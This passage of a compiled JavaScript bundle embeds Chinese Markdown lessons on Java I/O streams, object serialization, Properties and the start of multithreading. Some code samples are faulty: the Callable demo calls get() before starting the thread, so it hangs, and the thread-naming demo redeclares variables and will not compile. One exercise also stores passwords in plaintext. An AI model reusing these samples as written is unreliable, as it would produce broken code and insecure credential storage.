//void write(String str)：写一个字符串\n  //        fw.write("abcde");\n\n          //void write(String str, int off, int len)：写一个字符串的一部分\n  //        fw.write("abcde", 0, "abcde".length());\n          fw.write("abcde", 1, 3);\n\n          //释放资源\n          fw.close();\n      }\n  }\n  ```\n\n### 1.5字符流读数据【应用】\n\n+ 介绍\n\n  Reader: 用于读取字符流的抽象父类\n\n  FileReader: 用于读取字符流的常用子类\n\n\n+ 构造方法\n\n  | 方法名                         | 说明                                   |\n  | --------------------------- | ------------------------------------ |\n  | FileReader(File file)       | 在给定从中读取数据的 File 的情况下创建一个新 FileReader |\n  | FileReader(String fileName) | 在给定从中读取数据的文件名的情况下创建一个新 FileReader    |\n\n- 成员方法\n\n  | 方法名                   | 说明          |\n  | --------------------- | ----------- |\n  | int read()            | 一次读一个字符数据   |\n  | int read(char[] cbuf) | 一次读一个字符数组数据 |\n\n- 代码演示\n\n  ```java\n  public class InputStreamReaderDemo {\n      public static void main(String[] args) throws IOException {\n     \n          FileReader fr = new FileReader("myCharStream\\\\b.txt");\n\n          //int read()：一次读一个字符数据\n  //        int ch;\n  //        while ((ch=fr.read())!=-1) {\n  //            System.out.print((char)ch);\n  //        }\n\n          //int read(char[] cbuf)：一次读一个字符数组数据\n          char[] chs = new char[1024];\n          int len;\n          while ((len = fr.read(chs)) != -1) {\n              System.out.print(new String(chs, 0, len));\n          }\n\n          //释放资源\n          fr.close();\n      }\n  }\n  ```\n\n### 1.6字符流用户注册案例【应用】\n\n- 案例需求\n\n  将键盘录入的用户名和密码保存到本地实现永久化存储\n\n- 实现步骤\n  - 获取用户输入的用户名和密码\n  - 将用户输入的用户名和密码写入到本地文件中\n  - 关流,释放资源\n\n- 代码实现\n\n  ```java\n  public class CharStreamDemo8 {\n      public static void main(String[] args) throws IOException {\n          //需求: 将键盘录入的用户名和密码保存到本地实现永久化存储\n          //要求：用户名独占一行，密码独占一行\n\n          //分析：\n          //1，实现键盘录入，把用户名和密码录入进来\n          Scanner sc = new Scanner(System.in);\n          System.out.println("请录入用户名");\n          String username = sc.next();\n          System.out.println("请录入密码");\n          String password = sc.next();\n\n          //2.分别把用户名和密码写到本地文件。\n          FileWriter fw = new FileWriter("charstream\\\\a.txt");\n          //将用户名和密码写到文件中\n          fw.write(username);\n          //表示写出一个回车换行符 windows \\r\\n  MacOS \\r  Linux \\n\n          fw.write("\\r\\n");\n          fw.write(password);\n          //刷新流\n          fw.flush();\n          //3.关流,释放资源\n          fw.close();\n      }\n  }\n  ```\n\n### 1.7字符缓冲流【应用】\n\n- 字符缓冲流介绍\n\n  - BufferedWriter：将文本写入字符输出流，缓冲字符，以提供单个字符，数组和字符串的高效写入，可以指定缓冲区大小，或者可以接受默认大小。默认值足够大，可用于大多数用途\n\n  - BufferedReader：从字符输入流读取文本，缓冲字符，以提供字符，数组和行的高效读取，可以指定缓冲区大小，或者可以使用默认大小。 默认值足够大，可用于大多数用途\n\n- 构造方法\n\n  | 方法名                        | 说明          |\n  | -------------------------- | ----------- |\n  | BufferedWriter(Writer out) | 创建字符缓冲输出流对象 |\n  | BufferedReader(Reader in)  | 创建字符缓冲输入流对象 |\n\n- 代码演示\n\n  ```java\n  public class BufferedStreamDemo01 {\n      public static void main(String[] args) throws IOException {\n          //BufferedWriter(Writer out)\n          BufferedWriter bw = new BufferedWriter(new                                                            FileWriter("myCharStream\\\\bw.txt"));\n          bw.write("hello\\r\\n");\n          bw.write("world\\r\\n");\n          bw.close();\n\n          //BufferedReader(Reader in)\n          BufferedReader br = new BufferedReader(new                                                           FileReader("myCharStream\\\\bw.txt"));\n\n          //一次读取一个字符数据\n  //        int ch;\n  //        while ((ch=br.read())!=-1) {\n  //            System.out.print((char)ch);\n  //        }\n\n          //一次读取一个字符数组数据\n          char[] chs = new char[1024];\n          int len;\n          while ((len=br.read(chs))!=-1) {\n              System.out.print(new String(chs,0,len));\n          }\n\n          br.close();\n      }\n  }\n  ```\n\n### 1.8字符缓冲流特有功能【应用】\n\n- 方法介绍\n\n  BufferedWriter：\n\n  | 方法名            | 说明                     |\n  | -------------- | ---------------------- |\n  | void newLine() | 写一行行分隔符，行分隔符字符串由系统属性定义 |\n\n  BufferedReader:\n\n  | 方法名               | 说明                                       |\n  | ----------------- | ---------------------------------------- |\n  | String readLine() | 读一行文字。 结果包含行的内容的字符串，不包括任何行终止字符如果流的结尾已经到达，则为null |\n\n- 代码演示\n\n  ```java\n  public class BufferedStreamDemo02 {\n      public static void main(String[] args) throws IOException {\n\n          //创建字符缓冲输出流\n          BufferedWriter bw = new BufferedWriter(new                                                          FileWriter("myCharStream\\\\bw.txt"));\n\n          //写数据\n          for (int i = 0; i < 10; i++) {\n              bw.write("hello" + i);\n              //bw.write("\\r\\n");\n              bw.newLine();\n              bw.flush();\n          }\n\n          //释放资源\n          bw.close();\n\n          //创建字符缓冲输入流\n          BufferedReader br = new BufferedReader(new                                                          FileReader("myCharStream\\\\bw.txt"));\n\n          String line;\n          while ((line=br.readLine())!=null) {\n              System.out.println(line);\n          }\n\n          br.close();\n      }\n  }\n  ```\n\n### 1.9字符缓冲流操作文件中数据排序案例【应用】\n\n- 案例需求\n\n  使用字符缓冲流读取文件中的数据，排序后再次写到本地文件\n\n- 实现步骤\n\n  - 将文件中的数据读取到程序中\n  - 对读取到的数据进行处理\n  - 将处理后的数据添加到集合中\n  - 对集合中的数据进行排序\n  - 将排序后的集合中的数据写入到文件中\n\n- 代码实现\n\n  ```java\n  public class CharStreamDemo14 {\n      public static void main(String[] args) throws IOException {\n          //需求：读取文件中的数据，排序后再次写到本地文件\n          //分析：\n          //1.要把文件中的数据读取进来。\n          BufferedReader br = new BufferedReader(new FileReader("charstream\\\\sort.txt"));\n          //输出流一定不能写在这里，因为会清空文件中的内容\n          //BufferedWriter bw = new BufferedWriter(new FileWriter("charstream\\\\sort.txt"));\n\n          String line = br.readLine();\n          System.out.println("读取到的数据为" + line);\n          br.close();\n\n          //2.按照空格进行切割\n          String[] split = line.split(" ");//9 1 2 5 3 10 4 6 7 8\n          //3.把字符串类型的数组变成int类型\n          int [] arr = new int[split.length];\n          //遍历split数组，可以进行类型转换。\n          for (int i = 0; i < split.length; i++) {\n              String smallStr = split[i];\n              //类型转换\n              int number = Integer.parseInt(smallStr);\n              //把转换后的结果存入到arr中\n              arr[i] = number;\n          }\n          //4.排序\n          Arrays.sort(arr);\n          System.out.println(Arrays.toString(arr));\n\n          //5.把排序之后结果写回到本地 1 2 3 4...\n          BufferedWriter bw = new BufferedWriter(new FileWriter("charstream\\\\sort.txt"));\n          //写出\n          for (int i = 0; i < arr.length; i++) {\n              bw.write(arr[i] + " ");\n              bw.flush();\n          }\n          //释放资源\n          bw.close();\n\n      }\n  }\n  ```\n\n### 1.10IO流小结【理解】\n\n+ IO流小结\n\n  ![01_IO流小结](./img/java/basics/day20-IO流02.img/01_IO流小结.png)\n\n\n## 2.转换流\n\n### 2.1字符流中和编码解码问题相关的两个类【理解】\n\n- InputStreamReader：是从字节流到字符流的桥梁,父类是Reader\n\n  ​\t它读取字节，并使用指定的编码将其解码为字符\n\n  ​\t它使用的字符集可以由名称指定，也可以被明确指定，或者可以接受平台的默认字符集\n\n- OutputStreamWriter：是从字符流到字节流的桥梁,父类是Writer\n\n  ​\t是从字符流到字节流的桥梁，使用指定的编码将写入的字符编码为字节\n\n  ​\t它使用的字符集可以由名称指定，也可以被明确指定，或者可以接受平台的默认字符集\n\n### 2.2转换流读写数据【应用】\n\n+ 构造方法\n\n  | 方法名                                      | 说明                              |\n  | ---------------------------------------- | ------------------------------- |\n  | InputStreamReader(InputStream in)        | 使用默认字符编码创建InputStreamReader对象   |\n  | InputStreamReader(InputStream in,String chatset) | 使用指定的字符编码创建InputStreamReader对象  |\n  | OutputStreamWriter(OutputStream out)     | 使用默认字符编码创建OutputStreamWriter对象  |\n  | OutputStreamWriter(OutputStream out,String charset) | 使用指定的字符编码创建OutputStreamWriter对象 |\n\n+ 代码演示\n\n  ```java\n  public class ConversionStreamDemo {\n      public static void main(String[] args) throws IOException {\n          //OutputStreamWriter osw = new OutputStreamWriter(new                                             FileOutputStream("myCharStream\\\\osw.txt"));\n          OutputStreamWriter osw = new OutputStreamWriter(new                                              FileOutputStream("myCharStream\\\\osw.txt"),"GBK");\n          osw.write("中国");\n          osw.close();\n\n          //InputStreamReader isr = new InputStreamReader(new \t                                         FileInputStream("myCharStream\\\\osw.txt"));\n          InputStreamReader isr = new InputStreamReader(new                                                 FileInputStream("myCharStream\\\\osw.txt"),"GBK");\n          //一次读取一个字符数据\n          int ch;\n          while ((ch=isr.read())!=-1) {\n              System.out.print((char)ch);\n          }\n          isr.close();\n      }\n  }\n  ```\n\n## 3.对象操作流\n\n### 3.1对象序列化流【应用】\n\n- 对象序列化介绍\n\n  - 对象序列化：就是将对象保存到磁盘中，或者在网络中传输对象\n  - 这种机制就是使用一个字节序列表示一个对象，该字节序列包含：对象的类型、对象的数据和对象中存储的属性等信息\n  - 字节序列写到文件之后，相当于文件中持久保存了一个对象的信息\n  - 反之，该字节序列还可以从文件中读取回来，重构对象，对它进行反序列化\n\n- 对象序列化流： ObjectOutputStream\n\n  - 将Java对象的原始数据类型和图形写入OutputStream。 可以使用ObjectInputStream读取（重构）对象。 可以通过使用流的文件来实现对象的持久存储。 如果流是网络套接字流，则可以在另一个主机上或另一个进程中重构对象 \n\n- 构造方法\n\n  | 方法名                                  | 说明                                       |\n  | ------------------------------------ | ---------------------------------------- |\n  | ObjectOutputStream(OutputStream out) | 创建一个写入指定的OutputStream的ObjectOutputStream |\n\n- 序列化对象的方法\n\n  | 方法名                          | 说明                         |\n  | ---------------------------- | -------------------------- |\n  | void writeObject(Object obj) | 将指定的对象写入ObjectOutputStream |\n\n- 示例代码\n\n  学生类\n\n  ```java\n  public class Student implements Serializable {\n      private String name;\n      private int age;\n\n      public Student() {\n      }\n\n      public Student(String name, int age) {\n          this.name = name;\n          this.age = age;\n      }\n\n      public String getName() {\n          return name;\n      }\n\n      public void setName(String name) {\n          this.name = name;\n      }\n\n      public int getAge() {\n          return age;\n      }\n\n      public void setAge(int age) {\n          this.age = age;\n      }\n\n      @Override\n      public String toString() {\n          return "Student{" +\n                  "name=\'" + name + \'\\\'\' +\n                  ", age=" + age +\n                  \'}\';\n      }\n  }\n  ```\n\n  测试类\n\n  ```java\n  public class ObjectOutputStreamDemo {\n      public static void main(String[] args) throws IOException {\n          //ObjectOutputStream(OutputStream out)：创建一个写入指定的OutputStream的ObjectOutputStream\n          ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("myOtherStream\\\\oos.txt"));\n\n          //创建对象\n          Student s = new Student("佟丽娅",30);\n\n          //void writeObject(Object obj)：将指定的对象写入ObjectOutputStream\n          oos.writeObject(s);\n\n          //释放资源\n          oos.close();\n      }\n  }\n  ```\n\n- 注意事项\n\n  - 一个对象要想被序列化，该对象所属的类必须必须实现Serializable 接口\n  - Serializable是一个标记接口，实现该接口，不需要重写任何方法\n\n### 3.2对象反序列化流【应用】\n\n- 对象反序列化流： ObjectInputStream\n\n  - ObjectInputStream反序列化先前使用ObjectOutputStream编写的原始数据和对象\n\n- 构造方法\n\n  | 方法名                               | 说明                                    |\n  | --------------------------------- | ------------------------------------- |\n  | ObjectInputStream(InputStream in) | 创建从指定的InputStream读取的ObjectInputStream |\n\n- 反序列化对象的方法\n\n  | 方法名                 | 说明                       |\n  | ------------------- | ------------------------ |\n  | Object readObject() | 从ObjectInputStream读取一个对象 |\n\n- 示例代码\n\n  ```java\n  public class ObjectInputStreamDemo {\n      public static void main(String[] args) throws IOException, ClassNotFoundException {\n          //ObjectInputStream(InputStream in)：创建从指定的InputStream读取的ObjectInputStream\n          ObjectInputStream ois = new ObjectInputStream(new FileInputStream("myOtherStream\\\\oos.txt"));\n\n          //Object readObject()：从ObjectInputStream读取一个对象\n          Object obj = ois.readObject();\n\n          Student s = (Student) obj;\n          System.out.println(s.getName() + "," + s.getAge());\n\n          ois.close();\n      }\n  }\n  ```\n\n### 3.3serialVersionUID&transient【应用】\n\n- serialVersionUID\n\n  - 用对象序列化流序列化了一个对象后，假如我们修改了对象所属的类文件，读取数据会不会出问题呢？\n    - 会出问题，会抛出InvalidClassException异常\n  - 如果出问题了，如何解决呢？\n    - 重新序列化\n    - 给对象所属的类加一个serialVersionUID \n      - private static final long serialVersionUID = 42L;\n\n- transient\n\n  - 如果一个对象中的某个成员变量的值不想被序列化，又该如何实现呢？\n    - 给该成员变量加transient关键字修饰，该关键字标记的成员变量不参与序列化过程\n\n- 示例代码\n\n  学生类\n\n  ```java\n  public class Student implements Serializable {\n      private static final long serialVersionUID = 42L;\n      private String name;\n  //    private int age;\n      private transient int age;\n\n      public Student() {\n      }\n\n      public Student(String name, int age) {\n          this.name = name;\n          this.age = age;\n      }\n\n      public String getName() {\n          return name;\n      }\n\n      public void setName(String name) {\n          this.name = name;\n      }\n\n      public int getAge() {\n          return age;\n      }\n\n      public void setAge(int age) {\n          this.age = age;\n      }\n\n  //    @Override\n  //    public String toString() {\n  //        return "Student{" +\n  //                "name=\'" + name + \'\\\'\' +\n  //                ", age=" + age +\n  //                \'}\';\n  //    }\n  }\n  ```\n\n  测试类\n\n  ```java\n  public class ObjectStreamDemo {\n      public static void main(String[] args) throws IOException, ClassNotFoundException {\n  //        write();\n          read();\n      }\n\n      //反序列化\n      private static void read() throws IOException, ClassNotFoundException {\n          ObjectInputStream ois = new ObjectInputStream(new FileInputStream("myOtherStream\\\\oos.txt"));\n          Object obj = ois.readObject();\n          Student s = (Student) obj;\n          System.out.println(s.getName() + "," + s.getAge());\n          ois.close();\n      }\n\n      //序列化\n      private static void write() throws IOException {\n          ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("myOtherStream\\\\oos.txt"));\n          Student s = new Student("佟丽娅", 30);\n          oos.writeObject(s);\n          oos.close();\n      }\n  }\n  ```\n\n### 3.4对象操作流练习【应用】\n\n- 案例需求\n\n  创建多个学生类对象写到文件中,再次读取到内存中\n\n- 实现步骤\n\n  - 创建序列化流对象\n  - 创建多个学生对象\n  - 将学生对象添加到集合中\n  - 将集合对象序列化到文件中\n  - 创建反序列化流对象\n  - 将文件中的对象数据,读取到内存中\n\n- 代码实现\n\n  学生类\n\n  ```java\n  public class Student implements Serializable{\n      \n      private static final long serialVersionUID = 2L;\n\n      private String name;\n      private int age;\n\n      public Student() {\n      }\n\n      public Student(String name, int age) {\n          this.name = name;\n          this.age = age;\n      }\n\n      public String getName() {\n          return name;\n      }\n\n      public void setName(String name) {\n          this.name = name;\n      }\n\n      public int getAge() {\n          return age;\n      }\n\n      public void setAge(int age) {\n          this.age = age;\n      }\n  }\n  ```\n\n  测试类\n\n  ```java\n  public class Demo03 {\n      /**\n       *  read():\n       *      读取到文件末尾返回值是 -1\n       *  readLine():\n       *      读取到文件的末尾返回值 null\n       *  readObject():\n       *      读取到文件的末尾 直接抛出异常\n       *  如果要序列化的对象有多个,不建议直接将多个对象序列化到文件中,因为反序列化时容易出异常\n       *      建议: 将要序列化的多个对象存储到集合中,然后将集合序列化到文件中\n       */\n      public static void main(String[] args) throws Exception {\n          /*// 序列化\n          //1.创建序列化流对象\n          ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("myCode\\\\oos.txt"));\n          ArrayList<Student> arrayList = new ArrayList<>();\n          //2.创建多个学生对象\n          Student s = new Student("佟丽娅",30);\n          Student s01 = new Student("佟丽娅",30);\n          //3.将学生对象添加到集合中\n          arrayList.add(s);\n          arrayList.add(s01);\n          //4.将集合对象序列化到文件中\n          oos.writeObject(arrayList);\n          oos.close();*/\n\n          // 反序列化\n        \t//5.创建反序列化流对象\n          ObjectInputStream ois = new ObjectInputStream(new FileInputStream("myCode\\\\oos.txt"));\n        \t//6.将文件中的对象数据,读取到内存中\n          Object obj = ois.readObject();\n          ArrayList<Student> arrayList = (ArrayList<Student>)obj;\n          ois.close();\n          for (Student s : arrayList) {\n              System.out.println(s.getName() + "," + s.getAge());\n          }\n      }\n  }\n  ```\n\n## 4.Properties集合\n\n### 4.1Properties作为Map集合的使用【应用】\n\n- Properties介绍\n\n  - 是一个Map体系的集合类\n  - Properties可以保存到流中或从流中加载\n  - 属性列表中的每个键及其对应的值都是一个字符串\n\n- Properties基本使用\n\n  ```java\n  public class PropertiesDemo01 {\n      public static void main(String[] args) {\n          //创建集合对象\n  //        Properties<String,String> prop = new Properties<String,String>(); //错误\n          Properties prop = new Properties();\n\n          //存储元素\n          prop.put("itheima001", "佟丽娅");\n          prop.put("itheima002", "赵丽颖");\n          prop.put("itheima003", "刘诗诗");\n\n          //遍历集合\n          Set<Object> keySet = prop.keySet();\n          for (Object key : keySet) {\n              Object value = prop.get(key);\n              System.out.println(key + "," + value);\n          }\n      }\n  }\n  ```\n\n### 4.2Properties作为Map集合的特有方法【应用】\n\n- 特有方法\n\n  | 方法名                                      | 说明                                       |\n  | ---------------------------------------- | ---------------------------------------- |\n  | Object   setProperty(String key, String value) | 设置集合的键和值，都是String类型，底层调用   Hashtable方法 put |\n  | String   getProperty(String key)         | 使用此属性列表中指定的键搜索属性                         |\n  | Set<String>   stringPropertyNames()      | 从该属性列表中返回一个不可修改的键集，其中键及其对应的值是字符串         |\n\n- 示例代码\n\n  ```java\n  public class PropertiesDemo02 {\n      public static void main(String[] args) {\n          //创建集合对象\n          Properties prop = new Properties();\n\n          //Object setProperty(String key, String value)：设置集合的键和值，都是String类型\n          prop.setProperty("itheima001", "佟丽娅");\n          prop.setProperty("itheima002", "赵丽颖");\n          prop.setProperty("itheima003", "刘诗诗");\n\n          //String getProperty(String key)：使用此属性列表中指定的键搜索属性\n  //        System.out.println(prop.getProperty("itheima001"));\n  //        System.out.println(prop.getProperty("itheima0011"));\n\n  //        System.out.println(prop);\n\n          //Set<String> stringPropertyNames()：从该属性列表中返回一个不可修改的键集，其中键及其对应的值是字符串\n          Set<String> names = prop.stringPropertyNames();\n          for (String key : names) {\n  //            System.out.println(key);\n              String value = prop.getProperty(key);\n              System.out.println(key + "," + value);\n          }\n      }\n  }\n  ```\n\n### 4.3Properties和IO流相结合的方法【应用】\n\n- 和IO流结合的方法\n\n  | 方法名                                      | 说明                                       |\n  | ---------------------------------------- | ---------------------------------------- |\n  | void   load(Reader reader)               | 从输入字符流读取属性列表（键和元素对）                      |\n  | void   store(Writer writer, String comments) | 将此属性列表（键和元素对）写入此   Properties表中，以适合使用   load(Reader)方法的格式写入输出字符流 |\n\n- 示例代码\n\n  ```java\n  public class PropertiesDemo03 {\n      public static void main(String[] args) throws IOException {\n          //把集合中的数据保存到文件\n  //        myStore();\n\n          //把文件中的数据加载到集合\n          myLoad();\n\n      }\n\n      private static void myLoad() throws IOException {\n          Properties prop = new Properties();\n\n          //void load(Reader reader)：\n          FileReader fr = new FileReader("myOtherStream\\\\fw.txt");\n          prop.load(fr);\n          fr.close();\n\n          System.out.println(prop);\n      }\n\n      private static void myStore() throws IOException {\n          Properties prop = new Properties();\n\n          prop.setProperty("itheima001","佟丽娅");\n          prop.setProperty("itheima002","赵丽颖");\n          prop.setProperty("itheima003","刘诗诗");\n\n          //void store(Writer writer, String comments)：\n          FileWriter fw = new FileWriter("myOtherStream\\\\fw.txt");\n          prop.store(fw,null);\n          fw.close();\n      }\n  }\n  ```\n\n### 4.4Properties集合练习【应用】\n\n- 案例需求\n\n  在Properties文件中手动写上姓名和年龄,读取到集合中,将该数据封装成学生对象,写到本地文件\n\n- 实现步骤\n\n  - 创建Properties集合,将本地文件中的数据加载到集合中\n  - 获取集合中的键值对数据,封装到学生对象中\n  - 创建序列化流对象,将学生对象序列化到本地文件中\n\n- 代码实现\n\n  学生类\n\n  ```java\n  public class Student implements Serializable {\n      private static final long serialVersionUID = 1L;\n\n      private String name;\n      private int age;\n\n      public Student() {\n      }\n\n      public Student(String name, int age) {\n          this.name = name;\n          this.age = age;\n      }\n\n      public String getName() {\n          return name;\n      }\n\n      public void setName(String name) {\n          this.name = name;\n      }\n\n      public int getAge() {\n          return age;\n      }\n\n      public void setAge(int age) {\n          this.age = age;\n      }\n\n      @Override\n      public String toString() {\n          return "Student{" +\n                  "name=\'" + name + \'\\\'\' +\n                  ", age=" + age +\n                  \'}\';\n      }\n  }\n  ```\n\n  测试类\n\n  ```java\n  public class Test {\n\n      public static void main(String[] args) throws IOException {\n        \t//1.创建Properties集合,将本地文件中的数据加载到集合中\n          Properties prop = new Properties();\n          FileReader fr = new FileReader("prop.properties");\n          prop.load(fr);\n          fr.close();\n  \t\t//2.获取集合中的键值对数据,封装到学生对象中\n          String name = prop.getProperty("name");\n          int age = Integer.parseInt(prop.getProperty("age"));\n          Student s = new Student(name,age);\n  \t\t//3.创建序列化流对象,将学生对象序列化到本地文件中\n          ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("a.txt"));\n          oos.writeObject(s);\n          oos.close();\n      }\n  }\n  ```\n\n\n\n\n',Ln={data:function(){return{MainComponent1:Mn,MainComponent2:Rn}}},On=Ln,An=Object(u["a"])(On,Cn,jn,!1,null,"6037173d",null),In=An.exports,Dn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent1}}),t("q-markdown",{attrs:{src:n.MainComponent2}})],1)},Pn=[],Nn='\x3c!--\n * @Date           : 2021-04-27 00:32:23\n * @FilePath       : /jinnian-space/src/pages/java/module/basics/md/day21-多线程01.md\n * @Description    : \n--\x3e\n## 1.实现多线程\n\n### 1.1简单了解多线程【理解】\n\n是指从软件或者硬件上实现多个线程并发执行的技术。\n具有多线程能力的计算机因有硬件支持而能够在同一时间执行多个线程，提升性能。\n\n![01_简单了解多线程](./img/java/basics/day21-多线程01.img/01_简单了解多线程.png)\n\n### 1.2并发和并行【理解】\n\n+ 并行：在同一时刻，有多个指令在多个CPU上同时执行。\n\n  ![02_并行](./img/java/basics/day21-多线程01.img/02_并行.png)\n\n+ 并发：在同一时刻，有多个指令在单个CPU上交替执行。\n\n  ![03_并发](./img/java/basics/day21-多线程01.img/03_并发.png)\n\n### 1.3进程和线程【理解】\n\n- 进程：是正在运行的程序\n\n  独立性：进程是一个能独立运行的基本单位，同时也是系统分配资源和调度的独立单位\n  动态性：进程的实质是程序的一次执行过程，进程是动态产生，动态消亡的\n  并发性：任何进程都可以同其他进程一起并发执行\n\n- 线程：是进程中的单个顺序控制流，是一条执行路径\n\n  ​\t单线程：一个进程如果只有一条执行路径，则称为单线程程序\n\n  ​\t多线程：一个进程如果有多条执行路径，则称为多线程程序\n\n  ​\t![04_多线程示例](./img/java/basics/day21-多线程01.img/04_多线程示例.png)\n\n### 1.4实现多线程方式一：继承Thread类【应用】\n\n- 方法介绍\n\n  | 方法名          | 说明                         |\n  | ------------ | -------------------------- |\n  | void run()   | 在线程开启后，此方法将被调用执行           |\n  | void start() | 使此线程开始执行，Java虚拟机会调用run方法() |\n\n- 实现步骤\n  - 定义一个类MyThread继承Thread类\n  - 在MyThread类中重写run()方法\n  - 创建MyThread类的对象\n  - 启动线程\n\n- 代码演示\n\n  ```java\n  public class MyThread extends Thread {\n      @Override\n      public void run() {\n          for(int i=0; i<100; i++) {\n              System.out.println(i);\n          }\n      }\n  }\n  public class MyThreadDemo {\n      public static void main(String[] args) {\n          MyThread my1 = new MyThread();\n          MyThread my2 = new MyThread();\n\n  //        my1.run();\n  //        my2.run();\n\n          //void start() 导致此线程开始执行; Java虚拟机调用此线程的run方法\n          my1.start();\n          my2.start();\n      }\n  }\n  ```\n\n- 两个小问题\n\n  - 为什么要重写run()方法？\n\n    因为run()是用来封装被线程执行的代码\n\n  - run()方法和start()方法的区别？\n\n    run()：封装线程执行的代码，直接调用，相当于普通方法的调用\n\n    start()：启动线程；然后由JVM调用此线程的run()方法\n\n### 1.5实现多线程方式二：实现Runnable接口【应用】\n\n- Thread构造方法\n\n  | 方法名                                  | 说明             |\n  | ------------------------------------ | -------------- |\n  | Thread(Runnable target)              | 分配一个新的Thread对象 |\n  | Thread(Runnable target, String name) | 分配一个新的Thread对象 |\n\n- 实现步骤\n\n  - 定义一个类MyRunnable实现Runnable接口\n  - 在MyRunnable类中重写run()方法\n  - 创建MyRunnable类的对象\n  - 创建Thread类的对象，把MyRunnable对象作为构造方法的参数\n  - 启动线程\n\n- 代码演示\n\n  ```java\n  public class MyRunnable implements Runnable {\n      @Override\n      public void run() {\n          for(int i=0; i<100; i++) {\n              System.out.println(Thread.currentThread().getName()+":"+i);\n          }\n      }\n  }\n  public class MyRunnableDemo {\n      public static void main(String[] args) {\n          //创建MyRunnable类的对象\n          MyRunnable my = new MyRunnable();\n\n          //创建Thread类的对象，把MyRunnable对象作为构造方法的参数\n          //Thread(Runnable target)\n  //        Thread t1 = new Thread(my);\n  //        Thread t2 = new Thread(my);\n          //Thread(Runnable target, String name)\n          Thread t1 = new Thread(my,"坦克");\n          Thread t2 = new Thread(my,"飞机");\n\n          //启动线程\n          t1.start();\n          t2.start();\n      }\n  }\n  ```\n\n### 1.6实现多线程方式三: 实现Callable接口【应用】\n\n+ 方法介绍\n\n  | 方法名                              | 说明                                  |\n  | -------------------------------- | ----------------------------------- |\n  | V call()                         | 计算结果，如果无法计算结果，则抛出一个异常               |\n  | FutureTask(Callable<V> callable) | 创建一个 FutureTask，一旦运行就执行给定的 Callable |\n  | V get()                          | 如有必要，等待计算完成，然后获取其结果                 |\n\n+ 实现步骤\n\n  + 定义一个类MyCallable实现Callable接口\n  + 在MyCallable类中重写call()方法\n  + 创建MyCallable类的对象\n  + 创建Future的实现类FutureTask对象，把MyCallable对象作为构造方法的参数\n  + 创建Thread类的对象，把FutureTask对象作为构造方法的参数\n  + 启动线程\n  + 再调用get方法，就可以获取线程结束之后的结果。\n\n+ 代码演示\n\n  ```java\n  public class MyCallable implements Callable<String> {\n      @Override\n      public String call() throws Exception {\n          for (int i = 0; i < 100; i++) {\n              System.out.println("跟女孩表白" + i);\n          }\n          //返回值就表示线程运行完毕之后的结果\n          return "答应";\n      }\n  }\n  public class Demo {\n      public static void main(String[] args) throws ExecutionException, InterruptedException {\n          //线程开启之后需要执行里面的call方法\n          MyCallable mc = new MyCallable();\n\n          //Thread t1 = new Thread(mc);\n\n          //可以获取线程执行完毕之后的结果.也可以作为参数传递给Thread对象\n          FutureTask<String> ft = new FutureTask<>(mc);\n\n          //创建线程对象\n          Thread t1 = new Thread(ft);\n\n          String s = ft.get();\n          //开启线程\n          t1.start();\n\n          //String s = ft.get();\n          System.out.println(s);\n      }\n  }\n  ```\n\n+ 三种实现方式的对比\n  + 实现Runnable、Callable接口\n    + 好处: 扩展性强，实现该接口的同时还可以继承其他的类\n    + 缺点: 编程相对复杂，不能直接使用Thread类中的方法\n  + 继承Thread类\n    + 好处: 编程比较简单，可以直接使用Thread类中的方法\n    + 缺点: 可以扩展性较差，不能再继承其他的类\n\n### 1.7设置和获取线程名称【应用】\n\n- 方法介绍\n\n  | 方法名                        | 说明                 |\n  | -------------------------- | ------------------ |\n  | void  setName(String name) | 将此线程的名称更改为等于参数name |\n  | String  getName()          | 返回此线程的名称           |\n  | Thread  currentThread()    | 返回对当前正在执行的线程对象的引用  |\n\n- 代码演示\n\n  ```java\n  public class MyThread extends Thread {\n      public MyThread() {}\n      public MyThread(String name) {\n          super(name);\n      }\n\n      @Override\n      public void run() {\n          for (int i = 0; i < 100; i++) {\n              System.out.println(getName()+":"+i);\n          }\n      }\n  }\n  public class MyThreadDemo {\n      public static void main(String[] args) {\n          MyThread my1 = new MyThread();\n          MyThread my2 = new MyThread();\n\n          //void setName(String name)：将此线程的名称更改为等于参数 name\n          my1.setName("高铁");\n          my2.setName("飞机");\n\n          //Thread(String name)\n          MyThread my1 = new MyThread("高铁");\n          MyThread my2 = new MyThread("飞机");\n\n          my1.start();\n          my2.start();\n\n          //static Thread currentThread() 返回对当前正在执行的线程对象的引用\n          System.out.println(Thread.currentThread().getName());\n      }\n  }\n  ```\n\n### 1.8线程休眠【应用】\n\n+ 相关方法\n\n  | 方法名                            | 说明                       |\n  | ------------------------------ | ------------------------ |\n  | static void sleep(long millis) | 使当前正在执行的线程停留（暂停执行）指定的毫秒数 |\n\n+ 代码演示\n\n  ```java\n  public class MyRunnable implements Runnable {\n      @Override\n      public void run() {\n          for (int i = 0; i < 100; i++) {\n              try {\n                  Thread.sleep(100);\n              } catch (InterruptedException e) {\n                  e.printStackTrace();\n              }\n\n              System.out.println(Thread.currentThread().getName() + "---" + i);\n          }\n      }\n  }\n  public class Demo {\n      public static void main(String[] args) throws InterruptedException {\n          /*System.out.println("睡觉前");\n          Thread.sleep(3000);\n          System.out.println("睡醒了");*/\n\n          MyRunnable mr = new MyRunnable();\n\n          Thread t1 = new Thread(mr);\n          Thread t2 = new Thread(mr);\n\n          t1.start();\n          t2.start();\n      }\n  }\n  ```\n\n### 1.9线程优先级【应用】\n\n- 线程调度\n\n  - 两种调度方式\n    - 分时调度模型：所有线程轮流使用 CPU 的使用权，平均分配每个线程占用 CPU 的时间片\n    - 抢占式调度模型：优先让优先级高的线程使用 CPU，如果线程的优先级相同，那么会随机选择一个，优先级高的线程获取的 CPU 时间片相对多一些\n\n  - Java使用的是抢占式调度模型\n\n  - 随机性\n\n    假如计算机只有一个 CPU，那么 CPU 在某一个时刻只能执行一条指令，线程只有得到CPU时间片，也就是使用权，才可以执行指令。所以说多线程程序的执行是有随机性，因为谁抢到CPU的使用权是不一定的\n\n    ![05_多线程示例图](./img/java/basics/day21-多线程01.img/05_多线程示例图.png)\n\n- 优先级相关方法\n\n  | 方法名                                     | 说明                                |\n  | --------------------------------------- | --------------------------------- |\n  | final int getPriority()                 | 返回此线程的优先级                         |\n  | final void setPriority(int newPriority) | 